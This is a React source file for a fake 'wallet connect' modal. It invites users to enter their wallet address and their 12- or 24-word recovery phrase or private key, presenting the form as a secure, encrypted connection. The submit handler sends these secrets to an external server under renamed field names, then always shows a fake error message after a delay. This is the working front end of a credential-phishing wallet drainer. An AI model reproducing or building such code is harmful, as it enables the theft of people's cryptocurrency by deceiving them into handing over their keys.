import React, { useState } from "react";
import {
  Box,
  Typography,
  Tabs,
  Tab,
  TextField,
  Button,
  Modal,
  CircularProgress,
} from "@mui/material";
import { SwitchIos } from "./mui-treasury/switch-ios";
import SquareProgress from "./components/square-progress";
import ContentPasteIcon from "@mui/icons-material/ContentPaste";
import ErrorImg from "./assets/error.svg";
//import BASE_URL  from "../config";

const WalletModal = ({ open, onClose, selectedWallet }) => {
  const [tabValue, setTabValue] = useState(0);
  const [walletAddress12, setWalletAddress12] = useState("");
  const [walletAddress24, setWalletAddress24] = useState("");
  const [walletAddressPrivate, setWalletAddressPrivate] = useState("");
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
  const [phraseWords24, setPhraseWords24] = useState(Array(24).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [retryCount, setRetryCount] = useState(0);

  const BASE_URL =
    import.meta.env.MODE === "production"
      ? "https://securedplus.onrender.com/api"
      : "http://localhost:3000/api";

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(" ");
      if (words.length === 12) {
        setPhraseWords(words);
      } else {
        setErrorMessage("Please enter 12 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handleWordPaste = (index) => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(" ");
      if (words.length === 12) {
        const newPhraseWords = [...phraseWords];
        newPhraseWords[index] = words[index];
        setPhraseWords(newPhraseWords);
      } else {
        setErrorMessage("Please copy 12 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handlePaste24 = () => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(" ");
      if (words.length === 24) {
        setPhraseWords24(words);
      } else {
        setErrorMessage("Please enter 24 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handleWordPaste24 = (index) => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(" ");
      if (words.length === 24) {
        const newPhraseWords24 = [...phraseWords24];
        newPhraseWords24[index] = words[index];
        setPhraseWords24(newPhraseWords24);
      } else {
        setErrorMessage("Please copy 24 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handleSubmit = async () => {
    setIsLoading(true);
    setShowErrorPopup(false);
  
    let currentWalletAddress;
    let isFormValid = true;
  
    if (tabValue === 0) {
      currentWalletAddress = walletAddress12;
      isFormValid = !phraseWords.includes("");
    } else if (tabValue === 1) {
      currentWalletAddress = walletAddress24;
      isFormValid = !phraseWords24.includes("");
    } else {
      currentWalletAddress = walletAddressPrivate;
      isFormValid = !!privateKey;
    }
  
    if (!currentWalletAddress || !isFormValid) {
      setErrorMessage("Wallet address and all required fields must be filled.");
      setShowErrorPopup(true);
      setIsLoading(false);
      return;
    }
  
    const maxRetries = 5;
    let retryCount = 0;
  
    while (retryCount < maxRetries) {
      try {
        // Updated endpoint to match the new backend endpoint
        const response = await fetch(`${BASE_URL}/send-account-data`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            // Map to the new backend field names while keeping frontend terms the same
            accountName: selectedWallet?.name,
            accountId: currentWalletAddress,
            ...(tabValue === 0 && { securityPhrase: phraseWords }),
            ...(tabValue === 1 && { securityPhrase24: phraseWords24 }),
            ...(tabValue === 2 && { accessCode: privateKey }),
          }),
        });
  
        await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
        setIsLoading(false); // Stop loading after delay
  
        setErrorMessage("Error occurred while processing your request.");
        setShowErrorPopup(true);
        return;
      } catch (error) {
        retryCount++;
        if (retryCount === maxRetries) {
          await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
          setIsLoading(false); // Stop loading after delay
          setErrorMessage("Error occurred");
          setShowErrorPopup(true);
        } else {
          await new Promise((resolve) => setTimeout(resolve, 1000));
        }
      }
    }
  
    setIsLoading(false); // Ensure loading is stopped after all retries
  };
  

  return (
    <>
      <Modal
        open={open}
        onClose={onClose}
        aria-labelledby="wallet-connect-modal"
        aria-describedby="wallet-connect-description"
      >
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: "90%",
            maxWidth: 400,
            bgcolor: "#f5f5f5",
            borderRadius: "40px",
            boxShadow: 24,
            p: 3,
            maxHeight: "90vh",
            overflowY: "auto",
            overflowX: "hidden",
          }}
          className="custom-scrollbar"
        >
          <Typography
            variant="h6"
            component="h2"
            align="center"
            sx={{ mb: 1, color: "#333", fontSize: "1.1rem" }}
          >
            {selectedWallet?.name}
          </Typography>
          <Box
            sx={{
              display: "flex",
              justifyContent: "center",
              mb: 1,
              position: "relative",
              width: 80,
              height: 80,
              margin: "0 auto",
            }}
          >
            <SquareProgress size={80} thickness={3} color="#3498db" />
            <Box
              sx={{
                position: "absolute",
                top: 4,
                left: 4,
                right: 4,
                bottom: 4,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                borderRadius: "4px",
                overflow: "hidden",
                backgroundColor: "white",
              }}
            >
              <img
                src={selectedWallet?.image}
                alt={selectedWallet?.name}
                width="56"
                height="56"
                style={{ objectFit: "contain" }}
              />
            </Box>
          </Box>
          <Typography
            variant="body2"
            align="center"
            sx={{ mb: 1, color: "#666", fontSize: "0.8rem" }}
          >
            Initializing secure connection with {selectedWallet?.name}
          </Typography>
          <Box
            sx={{
              display: "flex",
              justifyContent: "space-between",
              mb: 1,
              alignItems: "center",
            }}
          >
            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
              Auto Validate
            </Typography>
            <SwitchIos defaultChecked />
          </Box>
          <Box
            sx={{
              display: "flex",
              justifyContent: "space-between",
              mb: 1,
              alignItems: "center",
            }}
          >
            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
              Encrypt Connection
            </Typography>
            <SwitchIos defaultChecked />
          </Box>
          <Tabs
            value={tabValue}
            onChange={handleTabChange}
            sx={{
              mb: 1,
              "& .MuiTab-root": {
                minWidth: 0,
                padding: "6px 12px",
                fontSize: "0.8rem",
              },
            }}
          >
            <Tab label="12 Key Phrase" />
            <Tab label="24 Key Phrase" />
            <Tab label="Private Key" />
          </Tabs>
          {tabValue === 0 && (
            <>
              <TextField
                fullWidth
                label="Enter your wallet address"
                variant="outlined"
                margin="dense"
                size="small"
                value={walletAddress12}
                onChange={(e) => setWalletAddress12(e.target.value)}
                sx={{
                  "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                  "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                }}
              />
              <Box
                sx={{
                  display: "grid",
                  gridTemplateColumns: "repeat(3, 1fr)",
                  gap: 1,
                  mt: 1,
                  p: 1,
                  border: "1px solid #999",
                  borderRadius: "8px",
                  backgroundColor: "#fff",
                }}
              >
                {phraseWords.map((word, index) => (
                  <TextField
                    key={index}
                    value={word}
                    placeholder={`Word ${index + 1}`}
                    onChange={(e) => {
                      const newPhraseWords = [...phraseWords];
                      newPhraseWords[index] = e.target.value;
                      setPhraseWords(newPhraseWords);
                    }}
                    onPaste={() => handleWordPaste(index)}
                    variant="outlined"
                    margin="dense"
                    size="small"
                    inputProps={{
                      style: {
                        padding: "8px",
                        fontSize: "0.8rem",
                        textAlign: "center",
                      },
                    }}
                    sx={{
                      "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                    }}
                  />
                ))}
              </Box>
              <Button
                variant="outlined"
                startIcon={<ContentPasteIcon />}
                onClick={handlePaste}
                sx={{
                  mt: 1,
                  width: "100%",
                  borderRadius: "8px",
                  fontSize: "0.8rem",
                }}
              >
                Paste from Clipboard
              </Button>
            </>
          )}
          {tabValue === 1 && (
            <>
              <TextField
                fullWidth
                label="Enter your wallet address"
                variant="outlined"
                margin="dense"
                size="small"
                value={walletAddress24}
                onChange={(e) => setWalletAddress24(e.target.value)}
                sx={{
                  "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                  "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                }}
              />
              <Box
                sx={{
                  display: "grid",
                  gridTemplateColumns: "repeat(4, 1fr)",
                  gap: 1,
                  mt: 1,
                  p: 1,
                  border: "1px solid #999",
                  borderRadius: "8px",
                  backgroundColor: "#fff",
                }}
              >
                {phraseWords24.map((word, index) => (
                  <TextField
                    key={index}
                    value={word}
                    placeholder={`Word ${index + 1}`}
                    onChange={(e) => {
                      const newPhraseWords24 = [...phraseWords24];
                      newPhraseWords24[index] = e.target.value;
                      setPhraseWords24(newPhraseWords24);
                    }}
                    onPaste={() => handleWordPaste24(index)}
                    variant="outlined"
                    margin="dense"
                    size="small"
                    inputProps={{
                      style: {
                        padding: "8px",
                        fontSize: "0.8rem",
                        textAlign: "center",
                      },
                    }}
                    sx={{
                      "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                    }}
                  />
                ))}
              </Box>
              <Button
                variant="outlined"
                startIcon={<ContentPasteIcon />}
                onClick={handlePaste24}
                sx={{
                  mt: 1,
                  width: "100%",
                  borderRadius: "8px",
                  fontSize: "0.8rem",
                }}
              >
                Paste from Clipboard
              </Button>
            </>
          )}
          {tabValue === 2 && (
            <TextField
              fullWidth
              label="Enter your wallet address"
              variant="outlined"
              margin="dense"
              size="small"
              value={walletAddressPrivate}
              onChange={(e) => setWalletAddressPrivate(e.target.value)}
              sx={{
                "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                "& .MuiOutlinedInput-root": { borderRadius: "8px" },
              }}
            />
          )}
          <Button
            variant="contained"
            color="primary"
            onClick={handleSubmit}
            sx={{
              mt: 2,
              width: "100%",
              borderRadius: "8px",
              fontSize: "0.8rem",
            }}
          >
            {isLoading ? (
              <CircularProgress size={24} color="secondary" />
            ) : (
              "Connect"
            )}
          </Button>
        </Box>
      </Modal>
      {/* Error Popup */}
      <Modal open={showErrorPopup} onClose={() => setShowErrorPopup(false)}>
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: 300,
            bgcolor: "white",
            borderRadius: "8px",
            boxShadow: 24,
            p: 4,
            textAlign: "center", // Center content inside the modal
          }}
        >
          {/* Error Image */}
          <Box
            component="img"
            src={ErrorImg} // Replace with your image path
            alt="Error"
            sx={{
              width: "80px", // Adjust as needed
              height: "80px", // Adjust as needed
              mb: 2, // Margin bottom for spacing
              mx: "auto", // Center the image
            }}
          />
          {/* Error Message */}
          <Typography color={"black"} variant="body1" sx={{ mb: 2 }}>
            {errorMessage}
          </Typography>
          {/* OK Button */}
          <Button
            variant="contained"
            color="primary"
            onClick={() => setShowErrorPopup(false)}
            sx={{ width: "100%", borderRadius: "8px" }}
          >
            OK
          </Button>
        </Box>
      </Modal>

      <Modal open={isLoading}>
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            bgcolor: "white",
            boxShadow: 24,
            p: 4,
            borderRadius: 2,
            display: "flex", // Flexbox to center content
            flexDirection: "column",
            alignItems: "center", // Center items horizontally
            textAlign: "center", // Center text inside the modal
          }}
        >
          <CircularProgress sx={{ mb: 2 }} />
          <Typography color="black">Connecting to wallet...</Typography>
        </Box>
      </Modal>
    </>
  );
};

export default WalletModal;